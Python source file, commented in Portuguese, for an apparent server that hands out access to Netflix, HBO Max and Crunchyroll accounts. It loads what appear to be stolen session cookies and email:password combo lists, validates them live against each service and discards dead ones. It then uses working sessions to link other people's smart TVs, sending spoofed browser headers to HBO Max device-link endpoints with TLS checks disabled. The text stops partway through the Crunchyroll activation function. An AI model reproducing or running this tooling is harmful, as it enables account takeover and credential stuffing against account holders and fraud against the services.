import os
import re
import json
import glob
import random
import uuid
import base64
import urllib3
import requests
from http.server import HTTPServer, SimpleHTTPRequestHandler
import socket
import socketserver
import hmac
import secrets
import threading
import time
import concurrent.futures
from datetime import datetime
from typing import Dict, Optional, Tuple, List, Set
import gerenciador_seguranca

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configurações de Pastas
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
NETFLIX_COOKIES_FOLDER = os.path.join(BASE_DIR, "netflix")
HBO_COOKIES_FOLDER = os.path.join(BASE_DIR, "hbomax")
CRUNCHYROLL_COMBO_FOLDER = os.path.join(BASE_DIR, "combo")
HITS_FOLDER = os.path.join(BASE_DIR, "hits")
USED_REGISTRY_FILE = os.path.join(BASE_DIR, "used_cookies.json")
COOKIES_BUNDLE_FILE = os.path.join(BASE_DIR, "cookies_bundle.json")
PORT = int(os.environ.get("PORT", 5000))
SERVER_DATA_VERSION = time.time()

def read_secure_text(fpath: str) -> str:
    """Lê um arquivo do cofre de forma segura, descriptografando em tempo real se estiver blindado."""
    if not os.path.exists(fpath):
        return ""
    try:
        with open(fpath, 'rb') as f:
            raw = f.read()
        key = gerenciador_seguranca.get_master_key()
        plain = gerenciador_seguranca.decrypt_bytes(raw, key)
        if plain is not None:
            return plain.decode('utf-8', errors='ignore')
        return raw.decode('utf-8', errors='ignore')
    except Exception:
        return ""

def sync_cookies_bundle():
    """Garante suporte total às pastas netflix, hbomax, combo e hits com suporte a criptografia."""
    os.makedirs(NETFLIX_COOKIES_FOLDER, exist_ok=True)
    os.makedirs(HITS_FOLDER, exist_ok=True)
    os.makedirs(HBO_COOKIES_FOLDER, exist_ok=True)
    os.makedirs(CRUNCHYROLL_COMBO_FOLDER, exist_ok=True)
    
    # Migra automaticamente arquivos antigos se existirem
    old_netflix = os.path.join(BASE_DIR, "cookies")
    old_hbo = os.path.join(BASE_DIR, "cookies 01")
    if os.path.exists(old_netflix):
        for f in glob.glob(os.path.join(old_netflix, "*.*")):
            dest = os.path.join(NETFLIX_COOKIES_FOLDER, os.path.basename(f))
            if not os.path.exists(dest):
                try:
                    with open(f, 'rb') as r_in, open(dest, 'wb') as r_out:
                        r_out.write(r_in.read())
                except Exception:
                    pass

    if os.path.exists(old_hbo):
        for f in glob.glob(os.path.join(old_hbo, "*.*")):
            dest = os.path.join(HBO_COOKIES_FOLDER, os.path.basename(f))
            if not os.path.exists(dest):
                try:
                    with open(f, 'rb') as r_in, open(dest, 'wb') as r_out:
                        r_out.write(r_in.read())
                except Exception:
                    pass

    # 1. Se o bundle existir, restaura as pastas no servidor
    if os.path.exists(COOKIES_BUNDLE_FILE):
        try:
            bundle_raw = read_secure_text(COOKIES_BUNDLE_FILE)
            if bundle_raw:
                data = json.loads(bundle_raw)
            
                for fname, content in data.get("netflix", {}).items():
                    dest = os.path.join(NETFLIX_COOKIES_FOLDER, fname)
                    if not os.path.exists(dest):
                        with open(dest, 'w', encoding='utf-8', errors='ignore') as out:
                            out.write(content)
                            
                for fname, content in data.get("hbo", {}).items():
                    dest = os.path.join(HBO_COOKIES_FOLDER, fname)
                    if not os.path.exists(dest):
                        with open(dest, 'w', encoding='utf-8', errors='ignore') as out:
                            out.write(content)

                for fname, content in data.get("crunchyroll", {}).items():
                    dest = os.path.join(CRUNCHYROLL_COMBO_FOLDER, fname)
                    if not os.path.exists(dest):
                        with open(dest, 'w', encoding='utf-8', errors='ignore') as out:
                            out.write(content)
        except Exception:
            pass

    # 2. Salva todos os cookies locais no arquivo único cookies_bundle.json
    bundle = {"netflix": {}, "hbo": {}, "crunchyroll": {}}
    for n_dir in [NETFLIX_COOKIES_FOLDER, old_netflix]:
        if os.path.exists(n_dir):
            for f in glob.glob(os.path.join(n_dir, "*.txt")) + glob.glob(os.path.join(n_dir, "*.json")):
                try:
                    c = read_secure_text(f)
                    if c:
                        bundle["netflix"][os.path.basename(f)] = c
                except Exception:
                    pass

    for h_dir in [HBO_COOKIES_FOLDER, old_hbo]:
        if os.path.exists(h_dir):
            for f in glob.glob(os.path.join(h_dir, "*.txt")) + glob.glob(os.path.join(h_dir, "*.json")):
                try:
                    c = read_secure_text(f)
                    if c:
                        bundle["hbo"][os.path.basename(f)] = c
                except Exception:
                    pass

    if os.path.exists(CRUNCHYROLL_COMBO_FOLDER):
        for f in glob.glob(os.path.join(CRUNCHYROLL_COMBO_FOLDER, "*.txt")):
            try:
                c = read_secure_text(f)
                if c:
                    bundle["crunchyroll"][os.path.basename(f)] = c
            except Exception:
                pass

    if bundle["netflix"] or bundle["hbo"] or bundle["crunchyroll"]:
        try:
            with open(COOKIES_BUNDLE_FILE, 'w', encoding='utf-8', errors='ignore') as outf:
                json.dump(bundle, outf)
        except Exception:
            pass

sync_cookies_bundle()

# Cache de cookies e estados em memória
USED_NETFLIX_COOKIES: Set[str] = set()
USED_HBO_COOKIES: Set[str] = set()

# Histórico
history_lock = threading.Lock()

def load_history() -> List[dict]:
    with history_lock:
        if os.path.exists(USED_REGISTRY_FILE):
            try:
                with open(USED_REGISTRY_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        return data
            except Exception:
                pass
        return []

def record_history_entry(service: str, filename: str, email: str, tv_code: str, plan: str = "", status: str = "Sucesso"):
    with history_lock:
        history = []
        if os.path.exists(USED_REGISTRY_FILE):
            try:
                with open(USED_REGISTRY_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    if isinstance(data, list):
                        history = data
            except Exception:
                history = []
        
        history.insert(0, {
            "service": service,
            "filename": os.path.basename(filename) if filename else "cookie",
            "email": email,
            "tv_code": tv_code,
            "plan": plan,
            "status": status,
            "used_at": datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        })

        try:
            with open(USED_REGISTRY_FILE, 'w', encoding='utf-8') as f:
                json.dump(history, f, indent=2, ensure_ascii=False)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════
#  INTEGRAÇÃO NETFLIX (MOTOR PROVADO TV2.PY COM VALIDAÇÃO REAL)
# ═══════════════════════════════════════════════════════════════
import tv2

USED_NETFLIX_COOKIES = tv2.USED_COOKIES
ACTIVE_PLAN = {"netflix": "TODOS", "hbo": "TODOS", "crunchyroll": "TODOS", "sky": "TODOS"}

# Cache de cookies testados e validados ao vivo
VALID_NETFLIX_LOCK = threading.Lock()
VALID_NETFLIX_BY_FILE: Dict[str, dict] = {}
VALID_NETFLIX_POOL: List[dict] = []
DEAD_NETFLIX_COOKIES: Set[str] = set()
COOKIE_FAIL_COUNTS: Dict[str, int] = {}

# HBO Valid Pool
VALID_HBO_LOCK = threading.Lock()
VALID_HBO_BY_FILE: Dict[str, dict] = {}
VALID_HBO_POOL: List[dict] = []

def get_netflix_files() -> List[str]:
    return tv2.get_available_cookie_files()

def classify_plan(filename: str, plan_text: str = "") -> str:
    combined = f"{filename} {plan_text}".lower()
    if any(k in combined for k in ['premium', 'cao cấp', 'uhd', '4k', 'vip', 'مميزة']):
        return 'PREMIUM'
    elif any(k in combined for k in ['com anúncio', 'with ads', 'with advert', 'avec pub', 'mit werbung', 'con anuncios', 'con pubblicità', 'reklam']):
        return 'COM ANÚNCIOS'
    elif any(k in combined for k in ['padrão', 'standard', 'estándar', 'standart', 'tiêu chuẩn', 'fhd', '1080', 'giá chuẩn', 'standardowy', 'قياسية', 'סטנדרטית']):
        return 'PADRÃO'
    elif any(k in combined for k in ['básico', 'basic', 'basis', 'dasar', 'essentiel', 'mobile', 'podstawowy', 'أساسية']):
        return 'BÁSICO'
    return 'PADRÃO'

def test_netflix_cookie_file(fpath: str, timeout: float = 4.0) -> Optional[dict]:
    """Testa se o arquivo de cookie possui sessão real ativa na Netflix."""
    if not os.path.exists(fpath):
        return None
    bname = os.path.basename(fpath)
    if fpath in DEAD_NETFLIX_COOKIES or bname in DEAD_NETFLIX_COOKIES or fpath in tv2.DEAD_COOKIES:
        return None

    with VALID_NETFLIX_LOCK:
        if fpath in VALID_NETFLIX_BY_FILE and fpath not in DEAD_NETFLIX_COOKIES:
            return VALID_NETFLIX_BY_FILE[fpath]

    try:
        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
            raw = f.read()
        parsed = tv2.load_cookies(raw)
        if not parsed or not any(k in parsed for k in ["NetflixId", "SecureNetflixId"]):
            DEAD_NETFLIX_COOKIES.add(fpath)
            tv2.DEAD_COOKIES.add(fpath)
            return None

        # Validação real contra os servidores da Netflix
        acc_info = tv2.check_account(parsed, timeout=timeout)
        if not acc_info:
            # Tolerância contra rate-limit transitório de rede: não descarta sumariamente no primeiro erro
            COOKIE_FAIL_COUNTS[fpath] = COOKIE_FAIL_COUNTS.get(fpath, 0) + 1
            if COOKIE_FAIL_COUNTS[fpath] >= 3:
                DEAD_NETFLIX_COOKIES.add(fpath)
                tv2.DEAD_COOKIES.add(fpath)
            return None

        COOKIE_FAIL_COUNTS[fpath] = 0
        cat = classify_plan(bname, acc_info.get("plan", ""))
        acc_info["category"] = cat

        entry = {
            "file": fpath,
            "parsed": parsed,
            "info": acc_info,
            "validated": True
        }

        with VALID_NETFLIX_LOCK:
            VALID_NETFLIX_BY_FILE[fpath] = entry
            if not any(e["file"] == fpath for e in VALID_NETFLIX_POOL):
                VALID_NETFLIX_POOL.append(entry)

        return entry
    except Exception:
        COOKIE_FAIL_COUNTS[fpath] = COOKIE_FAIL_COUNTS.get(fpath, 0) + 1
        if COOKIE_FAIL_COUNTS[fpath] >= 3:
            DEAD_NETFLIX_COOKIES.add(fpath)
            tv2.DEAD_COOKIES.add(fpath)
        return None

def extract_netflix_file_info(fpath: str) -> Optional[dict]:
    """Extrai informações do arquivo de cookie (email, plano, país) sem travar a requisição com rede."""
    if not os.path.exists(fpath):
        return None
    bname = os.path.basename(fpath)
    if fpath in DEAD_NETFLIX_COOKIES or bname in DEAD_NETFLIX_COOKIES or fpath in tv2.DEAD_COOKIES:
        return None

    try:
        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
            raw = f.read()

        parsed = tv2.load_cookies(raw)
        if not parsed or not any(k in parsed for k in ["NetflixId", "SecureNetflixId"]):
            return None

        email = ""
        country = "BR"
        plan = "PREMIUM"

        # 1. Regex no nome do arquivo: [BR] [email@domain.com] - Plano.txt
        fn_match = re.search(r'\[([A-Za-z]{2})\]\s*\[([^\]]+)\]\s*-\s*([^.]+)', bname)
        if fn_match:
            country = fn_match.group(1).upper()
            email = fn_match.group(2).strip()
            plan = fn_match.group(3).strip()

        # 2. Regex no conteúdo do arquivo caso o nome não tenha
        if not email:
            em_match = re.search(r'(?:📧|\bEmail\b)[\s:]*([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', raw, re.I)
            if em_match:
                email = em_match.group(1).strip()

        if not email:
            any_em = re.search(r'([a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)', raw)
            if any_em:
                email = any_em.group(1).strip()
            else:
                email = bname.replace('.txt', '').replace('.json', '')

        if country == "BR":
            c_match = re.search(r'(?:🌍|\bPais\b)[\s:]*.*?\(([A-Z]{2})\)', raw, re.I)
            if c_match:
                country = c_match.group(1).upper()
            else:
                c2_match = re.search(r'Country:\s*([A-Z]{2})', raw, re.I)
                if c2_match:
                    country = c2_match.group(1).upper()

        if plan == "PREMIUM" or not plan:
            p_match = re.search(r'(?:📋|\bPlano\b)[\s:]*([^\r\n]+)', raw, re.I)
            if p_match:
                plan = p_match.group(1).strip()

        cat = classify_plan(bname, plan)

        return {
            "file": fpath,
            "parsed": parsed,
            "info": {
                "email": email,
                "country": country,
                "plan": plan,
                "category": cat
            },
            "validated": False
        }
    except Exception:
        return None

def get_all_netflix_accounts() -> List[dict]:
    """Retorna todas as contas Netflix disponíveis da pasta (deduplicadas), com metadados instantâneos."""
    files = get_netflix_files()
    accounts = []
    seen_names = set()

    for fpath in files:
        bname = os.path.basename(fpath)
        if bname in seen_names:
            continue
        seen_names.add(bname)

        if fpath in DEAD_NETFLIX_COOKIES or bname in DEAD_NETFLIX_COOKIES or fpath in tv2.DEAD_COOKIES:
            continue

        # Se já tiver validação ao vivo salva em cache
        with VALID_NETFLIX_LOCK:
            if fpath in VALID_NETFLIX_BY_FILE and fpath not in DEAD_NETFLIX_COOKIES:
                accounts.append(VALID_NETFLIX_BY_FILE[fpath])
                continue

        # Extração instantânea de metadados
        meta = extract_netflix_file_info(fpath)
        if meta:
            accounts.append(meta)

    return accounts

def start_background_netflix_validator():
    """Valida em segundo plano os cookies restantes da pasta de forma suave sem derrubar conexões."""
    def _worker():
        time.sleep(15)
        while True:
            files = get_netflix_files()
            for f in files:
                bname = os.path.basename(f)
                if f in DEAD_NETFLIX_COOKIES or bname in DEAD_NETFLIX_COOKIES or f in tv2.DEAD_COOKIES:
                    continue
                with VALID_NETFLIX_LOCK:
                    if f in VALID_NETFLIX_BY_FILE:
                        continue
                try:
                    test_netflix_cookie_file(f, timeout=3.5)
                except Exception:
                    pass
                time.sleep(3.0)
            time.sleep(180)

    t = threading.Thread(target=_worker, daemon=True)
    t.start()

start_background_netflix_validator()

def get_verified_netflix_cookies(min_count: int = 1) -> List[dict]:
    """Retorna todas as contas Netflix disponíveis."""
    return get_all_netflix_accounts()

def find_netflix_valid_cookie(target_plan: str = "TODOS", exclude_file: str = "") -> Optional[dict]:
    """Retorna o próximo cookie Netflix 100% verificado contra os servidores da Netflix usando rotação circular de tv2.py."""
    if exclude_file:
        now_ts = time.time()
        tv2.LAST_USED_AT[exclude_file] = now_ts
        tv2.LAST_USED_AT[os.path.basename(exclude_file)] = now_ts

    cookie_data = tv2.find_next_valid_cookie()
    if cookie_data:
        f = cookie_data.get("file", "")
        with VALID_NETFLIX_LOCK:
            VALID_NETFLIX_BY_FILE[f] = cookie_data
        return cookie_data
    return None

# Alias de compatibilidade
find_netflix_fast_cookie = find_netflix_valid_cookie

def select_netflix_cookie_by_filename(filename: str) -> Optional[dict]:
    """Compatibilidade para seleção de cookie."""
    return find_netflix_valid_cookie()

def activate_netflix_tv(tv_code: str, cookie_data: dict) -> Tuple[bool, str, Optional[dict]]:
    """Executa a ativação da Smart TV Netflix utilizando o fluxo comprovado de tv2.py com rotação circular."""
    return tv2.activate_with_cookie(cookie_data, tv_code)




# ═══════════════════════════════════════════════════════════════
#  LÓGICA HBO MAX
# ═══════════════════════════════════════════════════════════════
HBO_ENDPOINTS = {
    "amer": {
        "validate": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "emea": {
        "validate": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "latam": {
        "validate": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/connect"
    },
    "apac": {
        "validate": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/validate",
        "connect": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/connect"
    }
}

COUNTRY_MAP = {
    "TR": "Turquia", "US": "Estados Unidos", "IN": "Índia",
    "GB": "Reino Unido", "FR": "França", "DE": "Alemanha",
    "ES": "Espanha", "IT": "Itália", "BR": "Brasil",
    "MX": "México", "AR": "Argentina", "CA": "Canadá",
    "AU": "Austrália", "JP": "Japão", "KR": "Coreia do Sul",
    "TH": "Tailândia", "PL": "Polônia", "CL": "Chile",
    "CO": "Colômbia", "PE": "Peru", "UY": "Uruguai"
}

def decode_jwt(token: str) -> Optional[Dict]:
    try:
        parts = token.split('.')
        if len(parts) >= 2:
            payload = parts[1]
            payload += '=' * (4 - len(payload) % 4)
            decoded = base64.b64decode(payload)
            return json.loads(decoded)
        return None
    except Exception:
        return None

def extract_hbo_st_token(content: str) -> Optional[str]:
    match = re.search(r'^st:\s*(eyJ[A-Za-z0-9_\-\.]+)', content, re.MULTILINE)
    if match:
        return match.group(1)
    match = re.search(r'st=([^;\s]+)', content)
    if match:
        t = match.group(1)
        if len(t.split('.')) == 3:
            return t
    match = re.search(r'(eyJ[A-Za-z0-9_\-\.]+)', content)
    if match:
        t = match.group(1)
        if len(t.split('.')) == 3:
            return t
    return None

def get_hbo_region_from_jwt(st_token: str) -> str:
    decoded = decode_jwt(st_token)
    if decoded:
        sub = decoded.get('subdivision', '')
        if 'amer' in sub:
            return 'amer'
        elif 'emea' in sub:
            return 'emea'
        elif 'latam' in sub:
            return 'latam'
        elif 'apac' in sub:
            return 'apac'
    return 'amer'

HBO_LAST_USED_AT: Dict[str, float] = {}
DEAD_HBO_COOKIES: Set[str] = set()
USED_HBO_COOKIES: Set[str] = set()

def get_hbo_files() -> List[str]:
    files = []
    seen_names = set()
    for h_dir in [HBO_COOKIES_FOLDER, os.path.join(BASE_DIR, "cookies 01")]:
        if os.path.exists(h_dir):
            for ext in ["*.txt", "*.json"]:
                for f in glob.glob(os.path.join(h_dir, ext)):
                    bname = os.path.basename(f)
                    if bname not in seen_names:
                        seen_names.add(bname)
                        files.append(os.path.abspath(f))

    # Exclui arquivos com sessão morta
    valid_files = [f for f in files if f not in DEAD_HBO_COOKIES and os.path.basename(f) not in DEAD_HBO_COOKIES]
    # Rotação circular LRU (menos recentemente usado primeiro)
    valid_files.sort(key=lambda f: (
        0 if "_br_" in os.path.basename(f).lower() else 1,
        HBO_LAST_USED_AT.get(f, HBO_LAST_USED_AT.get(os.path.basename(f), 0.0))
    ))
    return valid_files

def extract_hbo_file_info(filename: str) -> Optional[dict]:
    if not os.path.exists(filename):
        return None
    bname = os.path.basename(filename)
    if filename in DEAD_HBO_COOKIES or bname in DEAD_HBO_COOKIES:
        return None
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        st_token = extract_hbo_st_token(content)
        if not st_token:
            return None
        decoded = decode_jwt(st_token)
        if decoded:
            exp = decoded.get('exp', 0)
            if exp and datetime.fromtimestamp(exp) < datetime.now():
                DEAD_HBO_COOKIES.add(filename)
                DEAD_HBO_COOKIES.add(bname)
                return None
        region = get_hbo_region_from_jwt(st_token)
        email = bname.split('_')[0] if '_' in bname else bname
        country = "BR" if "_br_" in bname.lower() else "LATAM"
        plan = "HBO Max VIP"
        return {
            "file": filename,
            "st_token": st_token,
            "region": region,
            "info": {
                "email": email,
                "plan": plan,
                "country": country,
                "region": region.upper()
            },
            "validated": False
        }
    except Exception:
        return None

def get_hbo_user_info(st_token: str, region: str) -> Optional[Dict]:
    url = f"https://default.beam-{region}.prd.api.hbomax.com/users/me"
    headers = {
        "accept": "*/*",
        "accept-language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://play.hbomax.com",
        "referer": "https://play.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": "realm=bolt,bid=beam,features=ar",
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
    }
    try:
        res = requests.get(url, headers=headers, timeout=4, verify=False)
        if res.status_code == 200:
            return res.json()
        return None
    except Exception:
        return None

def is_hbo_free(user_data: Dict) -> bool:
    if not user_data or 'data' not in user_data:
        return True
    attrs = user_data.get('data', {}).get('attributes', {})
    if attrs.get('isFree') is True or attrs.get('isTrial') is True:
        return True
    sub_status = str(attrs.get('subscriptionStatus', '') or attrs.get('status', '') or attrs.get('accountStatus', '') or attrs.get('billingStatus', '')).lower()
    if sub_status in ['expired', 'inactive', 'canceled', 'cancelled', 'unsubscribed', 'suspended', 'past_due', 'pastdue', 'billing_issue', 'grace_period', 'hold', 'payment_failed']:
        return True
    if attrs.get('hasActiveSubscription') is False:
        return True
    return False

def get_all_hbo_accounts() -> List[dict]:
    """Retorna todas as contas HBO Max disponíveis da pasta, deduplicadas."""
    files = get_hbo_files()
    accounts = []
    seen = set()
    for filename in files:
        bname = os.path.basename(filename)
        if bname in seen:
            continue
        seen.add(bname)
        if filename in DEAD_HBO_COOKIES or bname in DEAD_HBO_COOKIES:
            continue
        with VALID_HBO_LOCK:
            if filename in VALID_HBO_BY_FILE:
                accounts.append(VALID_HBO_BY_FILE[filename])
                continue
        meta = extract_hbo_file_info(filename)
        if meta:
            accounts.append(meta)
    return accounts

def get_verified_hbo_cookies(min_count: int = 1) -> List[dict]:
    """Retorna a lista de contas HBO Max disponíveis."""
    return get_all_hbo_accounts()

def find_hbo_valid_cookie() -> Optional[dict]:
    all_hbo = get_all_hbo_accounts()
    if not all_hbo:
        return None
    return all_hbo[0]

def activate_hbo_tv(tv_code: str, cookie_data: dict) -> Tuple[bool, str, Optional[dict]]:
    clean_code = re.sub(r'[^0-9]', '', tv_code)
    if len(clean_code) != 6:
        return False, "O código HBO Max deve conter exatamente 6 dígitos numéricos (ex: 123456).", None

    if not cookie_data:
        return False, "Nenhum cookie HBO Max selecionado.", None

    st_token = cookie_data["st_token"]
    region = cookie_data["region"]
    filename = cookie_data["file"]

    device_id = str(uuid.uuid4())
    device_info = {
        "deviceId": device_id,
        "deviceName": "Chrome",
        "deviceModel": "Windows",
        "deviceType": "BROWSER",
        "osVersion": "10.0.0",
        "appVersion": "7.4.0",
        "manufacturer": "Google",
        "screenWidth": 1920,
        "screenHeight": 1080,
        "language": "pt-BR",
        "timezone": "America/Sao_Paulo"
    }
    device_info_b64 = base64.b64encode(json.dumps(device_info).encode()).decode()
    client_id = f"web_{uuid.uuid4().hex[:16]}"
    headers = {
        "accept": "*/*",
        "content-type": "application/json",
        "cookie": f"st={st_token}",
        "origin": "https://auth.hbomax.com",
        "referer": "https://auth.hbomax.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-disco-client": "WEB:10:hbomax:7.4.0",
        "x-disco-params": f"realm=bolt,bid=beam,features=ar,clientId={client_id}",
        "x-disco-device-info": device_info_b64,
        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
        "x-wbd-ace": "MjAyNi0wNi0xMVQxOTowNzo1M1p8VVMtQ0F8U0x8MVlOTg==",
        "x-wbd-device-consent": "gpc=0",
        "x-wbd-preferred-language": "pt-BR,pt",
        "x-wbd-time-zone": "America/Sao_Paulo",
        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
    }
    payload = {"linkingCode": clean_code}
    try:
        val_url = HBO_ENDPOINTS[region]["validate"]
        con_url = HBO_ENDPOINTS[region]["connect"]
        r1 = requests.post(val_url, headers=headers, json=payload, timeout=15, verify=False)
        if r1.status_code in [200, 204]:
            r2 = requests.post(con_url, headers=headers, json=payload, timeout=15, verify=False)
            if r2.status_code in [200, 204]:
                now_ts = time.time()
                HBO_LAST_USED_AT[filename] = now_ts
                HBO_LAST_USED_AT[os.path.basename(filename)] = now_ts
                record_history_entry("HBO Max", filename, cookie_data["info"]["email"], clean_code, cookie_data["info"]["plan"], "Sucesso")
                return True, "TV pareada e ativada com sucesso na HBO Max!", cookie_data["info"]
            else:
                DEAD_HBO_COOKIES.add(filename)
                return False, "Falha na etapa de conexão final com a TV na HBO Max.", None
        else:
            if r1.status_code == 400:
                try:
                    err = r1.json()
                    err_code = err.get('errors', [{}])[0].get('code', '')
                    if err_code == 'invalid.code':
                        return False, f"O código '{clean_code}' é inválido. Digite o código exibido na TV.", None
                    elif err_code == 'expired.code':
                        return False, f"O código '{clean_code}' expirou na TV. Gere um novo código de 6 dígitos.", None
                except Exception:
                    pass
            DEAD_HBO_COOKIES.add(filename)
            return False, "A sessão deste cookie HBO Max expirou. Próximo cookie pronto!", None
    except Exception as e:
        DEAD_HBO_COOKIES.add(filename)
        return False, f"Erro de conexão com os servidores da HBO Max: {str(e)}", None

def select_hbo_cookie_by_filename(filename: str) -> Optional[dict]:
    fpath = os.path.join(HBO_COOKIES_FOLDER, os.path.basename(filename))
    if not os.path.exists(fpath):
        return None
    try:
        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        st_token = extract_hbo_st_token(content)
        if not st_token:
            return None

        bname = os.path.basename(fpath)
        email = bname.split('_')[0] if '_' in bname else bname
        country = "BR" if "_br_" in bname.lower() else "LATAM"
        plan = "HBO Max VIP"
        region = get_hbo_region_from_jwt(st_token)

        user_data = get_hbo_user_info(st_token, region)
        if user_data:
            attrs = user_data.get('data', {}).get('attributes', {})
            real_email = attrs.get('username', '') or attrs.get('email', '')
            if real_email:
                email = real_email
            raw_country = attrs.get('verifiedHomeTerritory', country)
            country = COUNTRY_MAP.get(raw_country, raw_country)
            tier = attrs.get('tier', '') or attrs.get('productType', '') or "PREMIUM"
            plan = f"HBO Max {tier.upper()}"

        return {
            "file": fpath,
            "st_token": st_token,
            "region": region,
            "info": {
                "email": email,
                "plan": plan,
                "country": country,
                "region": region.upper()
            }
        }
    except Exception:
        return None

# ═══════════════════════════════════════════════════════════════
#  INTEGRAÇÃO CRUNCHYROLL (MOTOR COMBO & TV ACTIVATION REAL)
# ═══════════════════════════════════════════════════════════════
import crunchyroll

CRUNCHYROLL_COMBO_FOLDER = os.path.join(BASE_DIR, "combo")
os.makedirs(CRUNCHYROLL_COMBO_FOLDER, exist_ok=True)

VALID_CRUNCHYROLL_LOCK = threading.Lock()
VALID_CRUNCHYROLL_BY_EMAIL: Dict[str, dict] = {}
VALID_CRUNCHYROLL_POOL: List[dict] = []
CR_LAST_USED_AT: Dict[str, float] = {}
DEAD_CRUNCHYROLL_ACCOUNTS: Set[str] = set()
USED_CRUNCHYROLL_ACCOUNTS: Set[str] = set()

def get_all_crunchyroll_accounts() -> List[dict]:
    """Retorna todas as contas Crunchyroll dos combos com metadados rápidos e ordenação por rotação LRU."""
    combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
    combos.sort(key=lambda item: CR_LAST_USED_AT.get(item[0], 0.0))
    accounts = []
    seen = set()

    for email, pwd, fname in combos:
        if email in seen:
            continue
        seen.add(email)

        if email in DEAD_CRUNCHYROLL_ACCOUNTS:
            continue

        with VALID_CRUNCHYROLL_LOCK:
            if email in VALID_CRUNCHYROLL_BY_EMAIL and email not in DEAD_CRUNCHYROLL_ACCOUNTS:
                accounts.append(VALID_CRUNCHYROLL_BY_EMAIL[email])
                continue

        accounts.append({
            "file": fname,
            "email": email,
            "password": pwd,
            "info": {
                "email": email,
                "plan": "Crunchyroll VIP",
                "country": "BR"
            },
            "validated": False
        })
    return accounts

def test_crunchyroll_account(email: str, pwd: str, fname: str) -> Optional[dict]:
    """Valida ao vivo uma conta Crunchyroll nos servidores oficiais."""
    if email in DEAD_CRUNCHYROLL_ACCOUNTS:
        return None

    with VALID_CRUNCHYROLL_LOCK:
        if email in VALID_CRUNCHYROLL_BY_EMAIL and email not in DEAD_CRUNCHYROLL_ACCOUNTS:
            entry = VALID_CRUNCHYROLL_BY_EMAIL[email]
            if entry.get("exp", 0) > time.time() + 120:
                return entry

    session = crunchyroll.make_session()
    try:
        res = crunchyroll.check_account(session, email, pwd)
        status = res.get("status")

        if status in ["premium", "free"]:
            entry = {
                "file": fname,
                "email": email,
                "password": pwd,
                "access_token": res.get("access_token"),
                "exp": res.get("exp", int(time.time() + 3600)),
                "info": {
                    "email": email,
                    "plan": res.get("plan", "Crunchyroll VIP"),
                    "country": res.get("country", "BR"),
                    "benefits": res.get("benefits", [])
                },
                "validated": True
            }
            with VALID_CRUNCHYROLL_LOCK:
                VALID_CRUNCHYROLL_BY_EMAIL[email] = entry
                found = False
                for idx, e in enumerate(VALID_CRUNCHYROLL_POOL):
                    if e["email"] == email:
                        VALID_CRUNCHYROLL_POOL[idx] = entry
                        found = True
                        break
                if not found:
                    VALID_CRUNCHYROLL_POOL.append(entry)
            return entry
        elif res.get("reason") == "WRONG_CREDS":
            DEAD_CRUNCHYROLL_ACCOUNTS.add(email)
            return None
        else:
            return None
    except Exception:
        return None
    finally:
        session.close()

def find_crunchyroll_valid_account() -> Optional[dict]:
    """Retorna uma conta Crunchyroll válida e pronta para pareamento na TV usando rotação circular."""
    all_cr = get_all_crunchyroll_accounts()
    if not all_cr:
        return None
    return all_cr[0]

def select_crunchyroll_account_by_identifier(identifier: str) -> Optional[dict]:
    """Busca conta específica por email ou arquivo e a ativa."""
    combos = crunchyroll.load_combos(CRUNCHYROLL_COMBO_FOLDER)
    target = identifier.strip().lower()
    for email, pwd, fname in combos:
        if email.strip().lower() == target or fname.strip().lower() == target or target in email.strip().lower():
            valid = test_crunchyroll_account(email, pwd, fname)
            if valid:
                return valid
            return {
                "file": fname,
                "email": email,
                "password": pwd,
                "info": {
                    "email": email,
                    "plan": "Crunchyroll VIP",
                    "country": "BR"
                },
                "validated": False
            }
    return None

def activate_crunchyroll_tv(tv_code: str, account_data: dict) -> Tuple[bool, str, Optional[dict]]:
    """Envia código de ativação da TV para a Crunchyroll usando Email e Senha."""
    clean_code = re.sub(r'[^A-Za-z0-9]', '', tv_code).upper()
    if len(clean_code) < 6:
        return False, "O código de ativação da TV deve ter no mínimo 6 caracteres.", None

    if not account_data or "email" not in account_data:
        return False, "Nenhuma credencial válida da Crunchyroll encontrada nos combos.", None

    # Se não possui access_token ou token está expirado, obtém login fresco
    need_login = (not account_data.get("access_token")) or (account_data.get("exp", 0) < time.time() + 60)
    if need_login:
        session = crunchyroll.make_session()
